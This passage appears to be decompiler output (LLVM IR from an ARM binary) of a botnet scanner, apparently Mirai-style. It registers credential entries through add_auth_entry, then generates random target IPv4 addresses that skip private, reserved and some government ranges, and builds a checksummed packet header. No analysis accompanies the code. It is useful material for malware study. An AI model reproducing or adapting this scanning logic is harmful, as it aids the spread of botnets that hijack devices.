  %v5_e830 = call i32 @add_auth_entry(i32 ptrtoint ([5 x i8]* @global_var_19050.187 to i32), i32 ptrtoint ([5 x i8]* @global_var_19050.187 to i32), i32 8)
  store i32 ptrtoint ([5 x i8]* @global_var_19050.187 to i32), i32* %r0.global-to-local, align 4
  store i32 ptrtoint ([6 x i8]* @global_var_19048.185 to i32), i32* %r1.global-to-local, align 4
  store i32 9, i32* %r2.global-to-local, align 4
  %v5_e840 = call i32 @add_auth_entry(i32 ptrtoint ([5 x i8]* @global_var_19050.187 to i32), i32 ptrtoint ([6 x i8]* @global_var_19048.185 to i32), i32 9)
  store i32 ptrtoint ([8 x i8]* @global_var_1900c.173 to i32), i32* %r0.global-to-local, align 4
  store i32 ptrtoint (i32* @global_var_19058.189 to i32), i32* %r1.global-to-local, align 4
  store i32 15, i32* %r2.global-to-local, align 4
  %v4_e850 = call i32 @add_auth_entry(i32 ptrtoint ([8 x i8]* @global_var_1900c.173 to i32), i32 ptrtoint (i32* @global_var_19058.189 to i32), i32 15)
  store i32 ptrtoint ([8 x i8]* @global_var_1900c.173 to i32), i32* %r0.global-to-local, align 4
  store i32 ptrtoint (i32* @global_var_19064.191 to i32), i32* %r1.global-to-local, align 4
  store i32 15, i32* %r2.global-to-local, align 4
  %v4_e860 = call i32 @add_auth_entry(i32 ptrtoint ([8 x i8]* @global_var_1900c.173 to i32), i32 ptrtoint (i32* @global_var_19064.191 to i32), i32 15)
  store i32 %v4_e860, i32* %r0.global-to-local, align 4
  %v2_e868 = ptrtoint i32* %stack_var_-1866 to i32
  store i32 %v2_e868, i32* @lr, align 4
  %v1_eb94 = add i32 %v2_e868, 20
  %v1_ebe8 = add i32 %v2_e868, 16
  %v2_ebe8 = inttoptr i32 %v1_ebe8 to i32*
  %v1_ebfc = add i32 %v2_e868, 9
  %v2_ebfc = inttoptr i32 %v1_ebfc to i8*
  %v1_ec90 = add i32 %v2_e868, 12
  %v2_ec90 = inttoptr i32 %v1_ec90 to i32*
  %v2_ee74 = ptrtoint i32* %stack_var_-40 to i32
  %v2_eebc = ptrtoint i32* %stack_var_-68 to i32
  %v2_eec0 = ptrtoint i32* %stack_var_-224 to i32
  %v2_eec4 = ptrtoint i32* %stack_var_-352 to i32
  %v2_f898 = ptrtoint i32* %stack_var_-45 to i32
  %v2_f8ac = ptrtoint i32* %stack_var_-77 to i32
  %v2_f804 = ptrtoint i32* %stack_var_-60 to i32
  %v2_f9c0 = ptrtoint i32* %stack_var_-104 to i32
  %v2_e890 = ptrtoint i32* %stack_var_-96 to i32
  br label %dec_label_pc_e870

dec_label_pc_e870:                                ; preds = %dec_label_pc_f058, %dec_label_pc_e6d4
  %stack_var_-1876.0 = phi i32 [ %tmp334, %dec_label_pc_e6d4 ], [ %stack_var_-1876.1, %dec_label_pc_f058 ]
  store i32 ptrtoint (i32* @global_var_21908.135 to i32), i32* %r0.global-to-local, align 4
  store i32 %stack_var_-1876.0, i32* %r1.global-to-local, align 4
  %v2_e878 = load i32, i32* @global_var_21908.135, align 4
  store i32 %v2_e878, i32* @r4, align 4
  %v3_e87c = icmp uge i32 %stack_var_-1876.0, %v2_e878
  store i1 %v3_e87c, i1* %cpsr_c.global-to-local, align 1
  %v9_e87c = icmp eq i32 %stack_var_-1876.0, %v2_e878
  store i1 %v9_e87c, i1* %cpsr_z.global-to-local, align 1
  br i1 %v9_e87c, label %dec_label_pc_eb84, label %dec_label_pc_e884

dec_label_pc_e884:                                ; preds = %dec_label_pc_e870
  store i32 0, i32* %r3.global-to-local, align 4
  store i32 0, i32* %stack_var_-52, align 4
  store i32 %v2_e890, i32* @r5, align 4
  br label %dec_label_pc_e894

dec_label_pc_e894:                                ; preds = %bb407, %dec_label_pc_e884
  store i32 0, i32* %r3.global-to-local, align 4
  store i32 0, i32* %stack_var_-96, align 4
  %v0_e8a8 = call i32 @rand_next()
  %v1_e8a8 = trunc i32 %v0_e8a8 to i16
  store i32 %v0_e8a8, i32* %r0.global-to-local, align 4
  store i32 ptrtoint (i32* @global_var_243d0.55 to i32), i32* %r2.global-to-local, align 4
  store i32 ptrtoint (i8** @global_var_218d8.151 to i32), i32* %ip.global-to-local, align 4
  %v2_e8b4 = load i32, i32* @global_var_243d0.55, align 4
  store i32 %v2_e8b4, i32* %r3.global-to-local, align 4
  store i16 %v1_e8a8, i16* bitcast (i32* @global_var_218dc.156 to i16*), align 4
  store i32 %v2_e8b4, i32* @global_var_218e4.192, align 4
  br label %dec_label_pc_e8c0

dec_label_pc_e8c0:                                ; preds = %dec_label_pc_ea18, %dec_label_pc_e8f0, %dec_label_pc_ea4c, %dec_label_pc_ea40, %dec_label_pc_ea34, %dec_label_pc_ea28, %.thread48, %.thread32, %.thread28, %.thread24, %bb397, %bb396, %bb395, %bb394, %bb393, %bb392, %bb391, %bb390, %bb389, %dec_label_pc_e98c, %dec_label_pc_e984, %bb383, %dec_label_pc_e954, %dec_label_pc_e930, %bb376, %dec_label_pc_e900, %bb375, %dec_label_pc_e8e8, %bb374, %bb398, %bb400, %dec_label_pc_e894
  %v0_e8c0 = call i32 @rand_next()
  store i32 %v0_e8c0, i32* %r0.global-to-local, align 4
  %v1_e8c4 = urem i32 %v0_e8c0, 256
  store i32 %v1_e8c4, i32* %r1.global-to-local, align 4
  %v3_e8c8 = udiv i32 %v0_e8c0, 256
  store i32 %v3_e8c8, i32* %r3.global-to-local, align 4
  %v3_e8cc = udiv i32 %v0_e8c0, 65536
  store i32 %v3_e8cc, i32* %r2.global-to-local, align 4
  store i1 true, i1* %cpsr_c.global-to-local, align 1
  %v2_e8d0 = icmp eq i32 %v1_e8c4, 0
  store i1 %v2_e8d0, i1* %cpsr_z.global-to-local, align 1
  br i1 %v2_e8d0, label %bb374, label %bb373

bb373:                                            ; preds = %dec_label_pc_e8c0
  %v3_e8d4 = icmp ugt i32 %v1_e8c4, 126
  store i1 %v3_e8d4, i1* %cpsr_c.global-to-local, align 1
  %v8_e8d4 = icmp eq i32 %v1_e8c4, 127
  store i1 %v8_e8d4, i1* %cpsr_z.global-to-local, align 1
  br label %bb374

bb374:                                            ; preds = %dec_label_pc_e8c0, %bb373
  %v0_e8e4 = phi i1 [ true, %dec_label_pc_e8c0 ], [ %v8_e8d4, %bb373 ]
  %v1_e8d8 = urem i32 %v3_e8c8, 256
  store i32 %v1_e8d8, i32* %ip.global-to-local, align 4
  %v1_e8dc = urem i32 %v3_e8cc, 256
  store i32 %v1_e8dc, i32* %r2.global-to-local, align 4
  %v1_e8e0 = and i32 %v0_e8c0, 8388608
  %v2_e8e0 = icmp ne i32 %v1_e8e0, 0
  store i1 %v2_e8e0, i1* %cpsr_c.global-to-local, align 1
  %v3_e8e0 = udiv i32 %v0_e8c0, 16777216
  store i32 %v3_e8e0, i32* %r0.global-to-local, align 4
  br i1 %v0_e8e4, label %dec_label_pc_e8c0, label %dec_label_pc_e8e8

dec_label_pc_e8e8:                                ; preds = %bb374
  %v2_e8e8 = icmp ugt i32 %v1_e8c4, 2
  store i1 %v2_e8e8, i1* %cpsr_c.global-to-local, align 1
  %v7_e8e8 = icmp eq i32 %v1_e8c4, 3
  store i1 %v7_e8e8, i1* %cpsr_z.global-to-local, align 1
  br i1 %v7_e8e8, label %dec_label_pc_e8c0, label %dec_label_pc_e8f0

dec_label_pc_e8f0:                                ; preds = %dec_label_pc_e8e8
  %v1_e8f0 = add nsw i32 %v1_e8c4, -15
  store i32 %v1_e8f0, i32* %r3.global-to-local, align 4
  %v2_e8f4 = icmp ugt i32 %v1_e8c4, 55
  store i1 %v2_e8f4, i1* %cpsr_c.global-to-local, align 1
  %v7_e8f4 = icmp eq i32 %v1_e8c4, 56
  store i1 %v7_e8f4, i1* %cpsr_z.global-to-local, align 1
  br i1 %v7_e8f4, label %dec_label_pc_e8c0, label %bb375

bb375:                                            ; preds = %dec_label_pc_e8f0
  %v3_e8f8 = icmp ne i32 %v1_e8f0, 0
  store i1 %v3_e8f8, i1* %cpsr_c.global-to-local, align 1
  %v8_e8f8 = icmp eq i32 %v1_e8f0, 1
  store i1 %v8_e8f8, i1* %cpsr_z.global-to-local, align 1
  %v2_e8fc = xor i1 %v3_e8f8, true
  %v3_e8fc = or i1 %v8_e8f8, %v2_e8fc
  br i1 %v3_e8fc, label %dec_label_pc_e8c0, label %dec_label_pc_e900

dec_label_pc_e900:                                ; preds = %bb375
  %v2_e900 = icmp ugt i32 %v1_e8c4, 9
  store i1 %v2_e900, i1* %cpsr_c.global-to-local, align 1
  %v7_e900 = icmp eq i32 %v1_e8c4, 10
  store i1 %v7_e900, i1* %cpsr_z.global-to-local, align 1
  br i1 %v7_e900, label %dec_label_pc_e8c0, label %dec_label_pc_e908

dec_label_pc_e908:                                ; preds = %dec_label_pc_e900
  %v2_e908 = icmp ugt i32 %v1_e8c4, 191
  store i1 %v2_e908, i1* %cpsr_c.global-to-local, align 1
  %v7_e908 = icmp eq i32 %v1_e8c4, 192
  store i1 %v7_e908, i1* %cpsr_z.global-to-local, align 1
  br i1 %v7_e908, label %bb376, label %dec_label_pc_e914

bb376:                                            ; preds = %dec_label_pc_e908
  %v3_e90c = icmp ugt i32 %v1_e8d8, 167
  store i1 %v3_e90c, i1* %cpsr_c.global-to-local, align 1
  %v8_e90c = icmp eq i32 %v1_e8d8, 168
  store i1 %v8_e90c, i1* %cpsr_z.global-to-local, align 1
  br i1 %v8_e90c, label %dec_label_pc_e8c0, label %dec_label_pc_e914

dec_label_pc_e914:                                ; preds = %dec_label_pc_e908, %bb376
  %v7_e914 = icmp eq i32 %v1_e8c4, 172
  %.461 = zext i1 %v7_e914 to i32
  store i32 %.461, i32* %r3.global-to-local, align 4
  %v2_e920 = icmp ugt i32 %v1_e8d8, 14
  store i1 %v2_e920, i1* %cpsr_c.global-to-local, align 1
  %v7_e920 = icmp eq i32 %v1_e8d8, 15
  store i1 %v7_e920, i1* %cpsr_z.global-to-local, align 1
  %v2_e924 = xor i1 %v2_e920, true
  %v3_e924 = or i1 %v7_e920, %v2_e924
  br i1 %v3_e924, label %.thread8, label %bb379

.thread8:                                         ; preds = %dec_label_pc_e914
  store i32 0, i32* %r3.global-to-local, align 4
  store i1 true, i1* %cpsr_c.global-to-local, align 1
  store i1 true, i1* %cpsr_z.global-to-local, align 1
  br label %dec_label_pc_e938

bb379:                                            ; preds = %dec_label_pc_e914
  store i1 true, i1* %cpsr_c.global-to-local, align 1
  %v2_e928 = icmp eq i1 %v7_e914, false
  store i1 %v2_e928, i1* %cpsr_z.global-to-local, align 1
  br i1 %v2_e928, label %dec_label_pc_e938, label %dec_label_pc_e930

dec_label_pc_e930:                                ; preds = %bb379
  %v2_e930 = icmp ugt i32 %v1_e8d8, 30
  store i1 %v2_e930, i1* %cpsr_c.global-to-local, align 1
  %v7_e930 = icmp eq i32 %v1_e8d8, 31
  store i1 %v7_e930, i1* %cpsr_z.global-to-local, align 1
  %v2_e934 = xor i1 %v2_e930, true
  %v3_e934 = or i1 %v7_e930, %v2_e934
  br i1 %v3_e934, label %dec_label_pc_e8c0, label %dec_label_pc_e938

dec_label_pc_e938:                                ; preds = %.thread8, %dec_label_pc_e930, %bb379
  %v7_e938 = icmp eq i32 %v1_e8c4, 100
  %.462 = zext i1 %v7_e938 to i32
  store i32 %.462, i32* %r3.global-to-local, align 4
  %v2_e944 = icmp ugt i32 %v1_e8d8, 62
  store i1 %v2_e944, i1* %cpsr_c.global-to-local, align 1
  %v7_e944 = icmp eq i32 %v1_e8d8, 63
  store i1 %v7_e944, i1* %cpsr_z.global-to-local, align 1
  %v2_e948 = xor i1 %v2_e944, true
  %v3_e948 = or i1 %v7_e944, %v2_e948
  br i1 %v3_e948, label %.thread13, label %bb382

.thread13:                                        ; preds = %dec_label_pc_e938
  store i32 0, i32* %r3.global-to-local, align 4
  store i1 true, i1* %cpsr_c.global-to-local, align 1
  store i1 true, i1* %cpsr_z.global-to-local, align 1
  br label %dec_label_pc_e95c

bb382:                                            ; preds = %dec_label_pc_e938
  store i1 true, i1* %cpsr_c.global-to-local, align 1
  %v2_e94c = icmp eq i1 %v7_e938, false
  store i1 %v2_e94c, i1* %cpsr_z.global-to-local, align 1
  br i1 %v2_e94c, label %dec_label_pc_e95c, label %dec_label_pc_e954

dec_label_pc_e954:                                ; preds = %bb382
  %v2_e954 = icmp ugt i32 %v1_e8d8, 125
  store i1 %v2_e954, i1* %cpsr_c.global-to-local, align 1
  %v7_e954 = icmp eq i32 %v1_e8d8, 126
  store i1 %v7_e954, i1* %cpsr_z.global-to-local, align 1
  %v2_e958 = xor i1 %v2_e954, true
  %v3_e958 = or i1 %v7_e954, %v2_e958
  br i1 %v3_e958, label %dec_label_pc_e8c0, label %dec_label_pc_e95c

dec_label_pc_e95c:                                ; preds = %.thread13, %dec_label_pc_e954, %bb382
  %v2_e95c = icmp ugt i32 %v1_e8c4, 168
  store i1 %v2_e95c, i1* %cpsr_c.global-to-local, align 1
  %v7_e95c = icmp eq i32 %v1_e8c4, 169
  store i1 %v7_e95c, i1* %cpsr_z.global-to-local, align 1
  br i1 %v7_e95c, label %bb383, label %dec_label_pc_e968

bb383:                                            ; preds = %dec_label_pc_e95c
  %v3_e960 = icmp eq i32 %v1_e8d8, 255
  store i1 %v3_e960, i1* %cpsr_c.global-to-local, align 1
  store i1 %v3_e960, i1* %cpsr_z.global-to-local, align 1
  br i1 %v3_e960, label %dec_label_pc_e8c0, label %dec_label_pc_e968

dec_label_pc_e968:                                ; preds = %dec_label_pc_e95c, %bb383
  %v7_e968 = icmp eq i32 %v1_e8c4, 198
  %.463 = zext i1 %v7_e968 to i32
  store i32 %.463, i32* %r3.global-to-local, align 4
  %v2_e974 = icmp ugt i32 %v1_e8d8, 16
  store i1 %v2_e974, i1* %cpsr_c.global-to-local, align 1
  %v7_e974 = icmp eq i32 %v1_e8d8, 17
  store i1 %v7_e974, i1* %cpsr_z.global-to-local, align 1
  %v2_e978 = xor i1 %v2_e974, true
  %v3_e978 = or i1 %v7_e974, %v2_e978
  br i1 %v3_e978, label %.thread19, label %bb386

.thread19:                                        ; preds = %dec_label_pc_e968
  store i32 0, i32* %r3.global-to-local, align 4
  store i1 true, i1* %cpsr_c.global-to-local, align 1
  store i1 true, i1* %cpsr_z.global-to-local, align 1
  br label %dec_label_pc_e98c

bb386:                                            ; preds = %dec_label_pc_e968
  store i1 true, i1* %cpsr_c.global-to-local, align 1
  %v2_e97c = icmp eq i1 %v7_e968, false
  store i1 %v2_e97c, i1* %cpsr_z.global-to-local, align 1
  br i1 %v2_e97c, label %dec_label_pc_e98c, label %dec_label_pc_e984

dec_label_pc_e984:                                ; preds = %bb386
  %v2_e984 = icmp ugt i32 %v1_e8d8, 18
  store i1 %v2_e984, i1* %cpsr_c.global-to-local, align 1
  %v7_e984 = icmp eq i32 %v1_e8d8, 19
  store i1 %v7_e984, i1* %cpsr_z.global-to-local, align 1
  %v2_e988 = xor i1 %v2_e984, true
  %v3_e988 = or i1 %v7_e984, %v2_e988
  br i1 %v3_e988, label %dec_label_pc_e8c0, label %dec_label_pc_e98c

dec_label_pc_e98c:                                ; preds = %.thread19, %dec_label_pc_e984, %bb386
  %v2_e98c = icmp ugt i32 %v1_e8c4, 222
  store i1 %v2_e98c, i1* %cpsr_c.global-to-local, align 1
  %v7_e98c = icmp eq i32 %v1_e8c4, 223
  store i1 %v7_e98c, i1* %cpsr_z.global-to-local, align 1
  %v2_e990 = xor i1 %v7_e98c, true
  %v3_e990 = and i1 %v2_e98c, %v2_e990
  br i1 %v3_e990, label %dec_label_pc_e8c0, label %dec_label_pc_e994

dec_label_pc_e994:                                ; preds = %dec_label_pc_e98c
  %v7_e994 = icmp eq i32 %v1_e8c4, 106
  %.464 = zext i1 %v7_e994 to i32
  %v2_e9a0 = icmp ugt i32 %v1_e8d8, 185
  store i1 %v2_e9a0, i1* %cpsr_c.global-to-local, align 1
  %v7_e9a0 = icmp eq i32 %v1_e8d8, 186
  store i1 %v7_e9a0, i1* %cpsr_z.global-to-local, align 1
  br i1 %v7_e9a0, label %bb389, label %dec_label_pc_e9ac

bb389:                                            ; preds = %dec_label_pc_e994
  %v2_e994 = icmp ugt i32 %v1_e8c4, 105
  store i1 %v2_e994, i1* %cpsr_c.global-to-local, align 1
  store i1 %v7_e994, i1* %cpsr_z.global-to-local, align 1
  br i1 %v7_e994, label %dec_label_pc_e8c0, label %dec_label_pc_e9ac

dec_label_pc_e9ac:                                ; preds = %dec_label_pc_e994, %bb389
  %v2_e9ac = icmp ugt i32 %v1_e8d8, 186
  store i1 %v2_e9ac, i1* %cpsr_c.global-to-local, align 1
  %v7_e9ac = icmp eq i32 %v1_e8d8, 187
  store i1 %v7_e9ac, i1* %cpsr_z.global-to-local, align 1
  br i1 %v7_e9ac, label %.thread24, label %.thread25

.thread25:                                        ; preds = %dec_label_pc_e9ac
  store i32 0, i32* %r3.global-to-local, align 4
  store i1 true, i1* %cpsr_c.global-to-local, align 1
  store i1 true, i1* %cpsr_z.global-to-local, align 1
  br label %dec_label_pc_e9c0

.thread24:                                        ; preds = %dec_label_pc_e9ac
  store i32 %.464, i32* %r3.global-to-local, align 4
  store i1 true, i1* %cpsr_c.global-to-local, align 1
  %v2_e9b8 = icmp eq i1 %v7_e994, false
  store i1 %v2_e9b8, i1* %cpsr_z.global-to-local, align 1
  br i1 %v2_e9b8, label %dec_label_pc_e9c0, label %dec_label_pc_e8c0

dec_label_pc_e9c0:                                ; preds = %.thread25, %.thread24
  %v2_e9c0 = icmp ugt i32 %v1_e8d8, 184
  store i1 %v2_e9c0, i1* %cpsr_c.global-to-local, align 1
  %v7_e9c0 = icmp eq i32 %v1_e8d8, 185
  store i1 %v7_e9c0, i1* %cpsr_z.global-to-local, align 1
  br i1 %v7_e9c0, label %.thread28, label %.thread29

.thread29:                                        ; preds = %dec_label_pc_e9c0
  store i32 0, i32* %r3.global-to-local, align 4
  store i1 true, i1* %cpsr_c.global-to-local, align 1
  store i1 true, i1* %cpsr_z.global-to-local, align 1
  br label %dec_label_pc_e9d4

.thread28:                                        ; preds = %dec_label_pc_e9c0
  store i32 %.464, i32* %r3.global-to-local, align 4
  store i1 true, i1* %cpsr_c.global-to-local, align 1
  %v2_e9cc = icmp eq i1 %v7_e994, false
  store i1 %v2_e9cc, i1* %cpsr_z.global-to-local, align 1
  br i1 %v2_e9cc, label %dec_label_pc_e9d4, label %dec_label_pc_e8c0

dec_label_pc_e9d4:                                ; preds = %.thread29, %.thread28
  %v2_e9d4 = icmp ugt i32 %v1_e8d8, 183
  store i1 %v2_e9d4, i1* %cpsr_c.global-to-local, align 1
  %v7_e9d4 = icmp eq i32 %v1_e8d8, 184
  store i1 %v7_e9d4, i1* %cpsr_z.global-to-local, align 1
  br i1 %v7_e9d4, label %.thread32, label %.thread33

.thread33:                                        ; preds = %dec_label_pc_e9d4
  store i32 0, i32* %r3.global-to-local, align 4
  store i1 true, i1* %cpsr_c.global-to-local, align 1
  store i1 true, i1* %cpsr_z.global-to-local, align 1
  br label %dec_label_pc_e9e8

.thread32:                                        ; preds = %dec_label_pc_e9d4
  store i32 %.464, i32* %r3.global-to-local, align 4
  store i1 true, i1* %cpsr_c.global-to-local, align 1
  %v2_e9e0 = icmp eq i1 %v7_e994, false
  store i1 %v2_e9e0, i1* %cpsr_z.global-to-local, align 1
  br i1 %v2_e9e0, label %dec_label_pc_e9e8, label %dec_label_pc_e8c0

dec_label_pc_e9e8:                                ; preds = %.thread33, %.thread32
  %v2_e9e8 = icmp ugt i32 %v1_e8c4, 149
  store i1 %v2_e9e8, i1* %cpsr_c.global-to-local, align 1
  %v7_e9e8 = icmp eq i32 %v1_e8c4, 150
  store i1 %v7_e9e8, i1* %cpsr_z.global-to-local, align 1
  br i1 %v7_e9e8, label %bb390, label %dec_label_pc_e9f4

bb390:                                            ; preds = %dec_label_pc_e9e8
  %v3_e9ec = icmp ugt i32 %v1_e8d8, 30
  store i1 %v3_e9ec, i1* %cpsr_c.global-to-local, align 1
  %v8_e9ec = icmp eq i32 %v1_e8d8, 31
  store i1 %v8_e9ec, i1* %cpsr_z.global-to-local, align 1
  br i1 %v8_e9ec, label %dec_label_pc_e8c0, label %dec_label_pc_e9f4

dec_label_pc_e9f4:                                ; preds = %dec_label_pc_e9e8, %bb390
  %v2_e9f4 = icmp ugt i32 %v1_e8c4, 48
  store i1 %v2_e9f4, i1* %cpsr_c.global-to-local, align 1
  %v7_e9f4 = icmp eq i32 %v1_e8c4, 49
  store i1 %v7_e9f4, i1* %cpsr_z.global-to-local, align 1
  br i1 %v7_e9f4, label %bb391, label %dec_label_pc_ea00

bb391:                                            ; preds = %dec_label_pc_e9f4
  %v3_e9f8 = icmp ugt i32 %v1_e8d8, 50
  store i1 %v3_e9f8, i1* %cpsr_c.global-to-local, align 1
  %v8_e9f8 = icmp eq i32 %v1_e8d8, 51
  store i1 %v8_e9f8, i1* %cpsr_z.global-to-local, align 1
  br i1 %v8_e9f8, label %dec_label_pc_e8c0, label %dec_label_pc_ea00

dec_label_pc_ea00:                                ; preds = %dec_label_pc_e9f4, %bb391
  %v2_ea00 = icmp ugt i32 %v1_e8c4, 177
  store i1 %v2_ea00, i1* %cpsr_c.global-to-local, align 1
  %v7_ea00 = icmp eq i32 %v1_e8c4, 178
  store i1 %v7_ea00, i1* %cpsr_z.global-to-local, align 1
  br i1 %v7_ea00, label %bb392, label %dec_label_pc_ea0c

bb392:                                            ; preds = %dec_label_pc_ea00
  %v3_ea04 = icmp ugt i32 %v1_e8d8, 61
  store i1 %v3_ea04, i1* %cpsr_c.global-to-local, align 1
  %v8_ea04 = icmp eq i32 %v1_e8d8, 62
  store i1 %v8_ea04, i1* %cpsr_z.global-to-local, align 1
  br i1 %v8_ea04, label %dec_label_pc_e8c0, label %dec_label_pc_ea0c

dec_label_pc_ea0c:                                ; preds = %dec_label_pc_ea00, %bb392
  %v2_ea0c = icmp ugt i32 %v1_e8c4, 159
  store i1 %v2_ea0c, i1* %cpsr_c.global-to-local, align 1
  %v7_ea0c = icmp eq i32 %v1_e8c4, 160
  store i1 %v7_ea0c, i1* %cpsr_z.global-to-local, align 1
  br i1 %v7_ea0c, label %bb393, label %dec_label_pc_ea18

bb393:                                            ; preds = %dec_label_pc_ea0c
  %v3_ea10 = icmp ugt i32 %v1_e8d8, 12
  store i1 %v3_ea10, i1* %cpsr_c.global-to-local, align 1
  %v8_ea10 = icmp eq i32 %v1_e8d8, 13
  store i1 %v8_ea10, i1* %cpsr_z.global-to-local, align 1
  br i1 %v8_ea10, label %dec_label_pc_e8c0, label %dec_label_pc_ea18

dec_label_pc_ea18:                                ; preds = %dec_label_pc_ea0c, %bb393
  %v1_ea18 = add nsw i32 %v1_e8c4, -6
  store i32 %v1_ea18, i32* %r3.global-to-local, align 4
  %v2_ea1c = icmp ugt i32 %v1_e8c4, 10
  store i1 %v2_ea1c, i1* %cpsr_c.global-to-local, align 1
  %v7_ea1c = icmp eq i32 %v1_e8c4, 11
  store i1 %v7_ea1c, i1* %cpsr_z.global-to-local, align 1
  br i1 %v7_ea1c, label %dec_label_pc_e8c0, label %bb394

bb394:                                            ; preds = %dec_label_pc_ea18
  %v3_ea20 = icmp ne i32 %v1_ea18, 0
  store i1 %v3_ea20, i1* %cpsr_c.global-to-local, align 1
  %v8_ea20 = icmp eq i32 %v1_ea18, 1
  store i1 %v8_ea20, i1* %cpsr_z.global-to-local, align 1
  %v2_ea24 = xor i1 %v3_ea20, true
  %v3_ea24 = or i1 %v8_ea20, %v2_ea24
  br i1 %v3_ea24, label %dec_label_pc_e8c0, label %dec_label_pc_ea28

dec_label_pc_ea28:                                ; preds = %bb394
  %v2_ea28 = icmp ugt i32 %v1_e8c4, 21
  store i1 %v2_ea28, i1* %cpsr_c.global-to-local, align 1
  %v7_ea28 = icmp eq i32 %v1_e8c4, 22
  store i1 %v7_ea28, i1* %cpsr_z.global-to-local, align 1
  br i1 %v7_ea28, label %dec_label_pc_e8c0, label %bb395

bb395:                                            ; preds = %dec_label_pc_ea28
  %v3_ea2c = icmp ugt i32 %v1_e8c4, 20
  store i1 %v3_ea2c, i1* %cpsr_c.global-to-local, align 1
  %v8_ea2c = icmp eq i32 %v1_e8c4, 21
  store i1 %v8_ea2c, i1* %cpsr_z.global-to-local, align 1
  br i1 %v8_ea2c, label %dec_label_pc_e8c0, label %dec_label_pc_ea34

dec_label_pc_ea34:                                ; preds = %bb395
  %v2_ea34 = icmp ugt i32 %v1_e8c4, 27
  store i1 %v2_ea34, i1* %cpsr_c.global-to-local, align 1
  %v7_ea34 = icmp eq i32 %v1_e8c4, 28
  store i1 %v7_ea34, i1* %cpsr_z.global-to-local, align 1
  br i1 %v7_ea34, label %dec_label_pc_e8c0, label %bb396

bb396:                                            ; preds = %dec_label_pc_ea34
  %v3_ea38 = icmp ugt i32 %v1_e8c4, 25
  store i1 %v3_ea38, i1* %cpsr_c.global-to-local, align 1
  %v8_ea38 = icmp eq i32 %v1_e8c4, 26
  store i1 %v8_ea38, i1* %cpsr_z.global-to-local, align 1
  br i1 %v8_ea38, label %dec_label_pc_e8c0, label %dec_label_pc_ea40

dec_label_pc_ea40:                                ; preds = %bb396
  %v2_ea40 = icmp ugt i32 %v1_e8c4, 29
  store i1 %v2_ea40, i1* %cpsr_c.global-to-local, align 1
  %v7_ea40 = icmp eq i32 %v1_e8c4, 30
  store i1 %v7_ea40, i1* %cpsr_z.global-to-local, align 1
  br i1 %v7_ea40, label %dec_label_pc_e8c0, label %bb397

bb397:                                            ; preds = %dec_label_pc_ea40
  %v3_ea44 = icmp ugt i32 %v1_e8c4, 28
  store i1 %v3_ea44, i1* %cpsr_c.global-to-local, align 1
  %v8_ea44 = icmp eq i32 %v1_e8c4, 29
  store i1 %v8_ea44, i1* %cpsr_z.global-to-local, align 1
  br i1 %v8_ea44, label %dec_label_pc_e8c0, label %dec_label_pc_ea4c

dec_label_pc_ea4c:                                ; preds = %bb397
  %v2_ea4c = icmp ugt i32 %v1_e8c4, 54
  store i1 %v2_ea4c, i1* %cpsr_c.global-to-local, align 1
  %v7_ea4c = icmp eq i32 %v1_e8c4, 55
  store i1 %v7_ea4c, i1* %cpsr_z.global-to-local, align 1
  br i1 %v7_ea4c, label %dec_label_pc_e8c0, label %bb398

bb398:                                            ; preds = %dec_label_pc_ea4c
  %v3_ea50 = icmp ugt i32 %v1_e8c4, 32
  store i1 %v3_ea50, i1* %cpsr_c.global-to-local, align 1
  %v8_ea50 = icmp eq i32 %v1_e8c4, 33
  store i1 %v8_ea50, i1* %cpsr_z.global-to-local, align 1
  br i1 %v8_ea50, label %dec_label_pc_e8c0, label %dec_label_pc_ea58

dec_label_pc_ea58:                                ; preds = %bb398
  %v2_ea58 = icmp ugt i32 %v1_e8c4, 214
  store i1 %v2_ea58, i1* %cpsr_c.global-to-local, align 1
  %v7_ea58 = icmp eq i32 %v1_e8c4, 215
  store i1 %v7_ea58, i1* %cpsr_z.global-to-local, align 1
  br i1 %v7_ea58, label %.thread48, label %bb399

bb399:                                            ; preds = %dec_label_pc_ea58
  %v3_ea5c = icmp ugt i32 %v1_e8c4, 213
  store i1 %v3_ea5c, i1* %cpsr_c.global-to-local, align 1
  %v8_ea5c = icmp eq i32 %v1_e8c4, 214
  store i1 %v8_ea5c, i1* %cpsr_z.global-to-local, align 1
  br i1 %v8_ea5c, label %bb400, label %dec_label_pc_ea6c

.thread48:                                        ; preds = %dec_label_pc_ea58
  br label %dec_label_pc_e8c0

bb400:                                            ; preds = %bb399
  br label %dec_label_pc_e8c0

dec_label_pc_ea6c:                                ; preds = %bb399
  %v5_ea78 = call i32 @llvm.bswap.i32(i32 %v0_e8c0)
  store i32 %v5_ea78, i32* %r3.global-to-local, align 4
  %tmp401 = and i32 %v0_e8c0, 65280
  %tmp402 = call i32 @llvm.bswap.i32(i32 %tmp401)
  %v3_ea80 = udiv i32 %v5_ea78, 16777216
  %tmp403 = and i32 %v0_e8c0, 16711680
  %tmp404 = call i32 @llvm.bswap.i32(i32 %tmp403)
  %v4_ea88 = udiv i32 %tmp402, 256
  %v4_ea8c = mul nuw nsw i32 %tmp404, 256
  store i32 ptrtoint (i8** @global_var_218d8.151 to i32), i32* @r0, align 4
  %tmp405 = and i32 %v0_e8c0, 65536
  %v3_ea94 = icmp ne i32 %tmp405, 0
  store i1 %v3_ea94, i1* %cpsr_c.global-to-local, align 1
  %v4_ea94 = mul i32 %v5_ea78, 16777216
  %v5_ea88 = or i32 %v4_ea94, %v3_ea80
  %v5_ea8c = or i32 %v5_ea88, %v4_ea88
  %v5_ea94 = or i32 %v5_ea8c, %v4_ea8c
  store i32 %v5_ea94, i32* %r2.global-to-local, align 4
  store i16 0, i16* bitcast (i32* @global_var_218e2.193 to i16*), align 4
  store i32 20, i32* %r1.global-to-local, align 4
  store i32 %v5_ea94, i32* @global_var_218e8.194, align 4
  %v3_eaa4 = call i32 @checksum_generic(i32 ptrtoint (i8** @global_var_218d8.151 to i32), i32 20)
  %v4_eaa4 = trunc i32 %v3_eaa4 to i16
  store i32 %v3_eaa4, i32* %r0.global-to-local, align 4
  %v3_eaa8 = load i32, i32* %stack_var_-52, align 4
  %v5_eab8 = sdiv i32 %v3_eaa8, 10
  %v3_eabc = mul i32 %v5_eab8, 8
  store i32 %v3_eabc, i32* %r2.global-to-local, align 4
  %v2_eac4 = mul i32 %v5_eab8, 10
  store i32 %v2_eac4, i32* %r3.global-to-local, align 4
  %v3_eac8 = icmp uge i32 %v3_eaa8, %v2_eac4
  store i1 %v3_eac8, i1* %cpsr_c.global-to-local, align 1
  %v9_eac8 = icmp eq i32 %v3_eaa8, %v2_eac4
  store i1 %v9_eac8, i1* %cpsr_z.global-to-local, align 1
